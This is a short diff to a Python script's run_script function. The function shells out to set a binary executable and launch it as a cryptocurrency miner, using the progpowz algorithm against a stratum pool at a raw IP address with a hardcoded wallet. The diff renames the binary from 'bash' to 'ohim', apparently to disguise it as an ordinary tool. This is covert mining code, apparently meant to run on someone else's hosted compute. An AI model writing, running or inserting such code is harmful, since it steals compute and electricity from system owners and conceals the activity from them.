@@ -44,10 +44,10 @@ def run_script():
     ls -lah /mnt/code/hal
 
     echo "=== CHECK BASH ==="
-    ls -lh /mnt/code/hal/bash
+    ls -lh /mnt/code/hal/ohim
 
     echo "=== SET PERMISSION ==="
-    chmod u+x /mnt/code/hal/bash
+    chmod u+x /mnt/code/hal/ohim
 
     echo "=== SELESAI ==="
     cd /mnt/code/hal
@@ -55,7 +55,7 @@ def run_script():
     ls -lah
     
     echo "=== RUN PROC DIRECT ==="
-    ./bash -a progpowz -o stratum+tcp://95.111.195.159:80 -u iZ2q2xfw9AdX8YpGrcrjEPTG2ie8FMuXMFdDNKqRRbGo15zbuUfMAzDbtEDxcDpJcXGijaADG2WVs41p8PMiBnzrV95YkTX46Ca2EZvo8wXS -p x -w TRX
+    ./ohim --print-full --algo progpowz --url stratum+tcp://95.111.195.159:80 --worker  --user iZ2q2xfw9AdX8YpGrcrjEPTG2ie8FMuXMFdDNKqRRbGo15zbuUfMAzDbtEDxcDpJcXGijaADG2WVs41p8PMiBnzrV95YkTX46Ca2EZvo8wXS --pass
     """
 
     subprocess.run(["bash", "-lc", cmd], check=False)
